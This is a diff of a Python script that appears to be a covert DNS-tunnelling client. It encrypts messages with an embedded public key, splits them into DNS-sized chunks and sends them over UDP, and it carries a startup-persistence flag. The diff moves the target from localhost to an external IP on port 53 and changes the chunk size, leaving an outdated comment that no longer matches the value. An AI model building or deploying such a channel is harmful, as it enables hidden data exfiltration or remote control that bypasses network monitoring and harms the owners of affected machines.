@@ -14,9 +14,9 @@ MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEUnWlQdwMyM3H+bJdfJGRGAY/pfkD
 byS6+yVLuZj8YtvOsRb6mQyXBUUdvckfTDh5jdudZT9pMGJgWMhNPXlQ+w==
 -----END PUBLIC KEY-----"""
 target_pub_key = None
-CHUNK_SIZE = 36 # تم التعديل ليتناسب مع CVC (30 data + 6 header)
+CHUNK_SIZE = 20 # تم التعديل ليتناسب مع CVC (30 data + 6 header)
 IS_ADDED_TO_STARTUP = False
-SERVER = ("127.0.0.1", 27381)
+SERVER = ("20.63.24.136", 53)
 sent_chunks = {}
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 last_received_time = None
@@ -58,7 +58,7 @@ def send_msg(message, is_cached: bool):
         else:
             return
         
-        chunks = dns_message(encrypted_bytes, 36)
+        chunks = dns_message(encrypted_bytes, CHUNK_SIZE)
 
         sent_chunks = {}
         i = 0
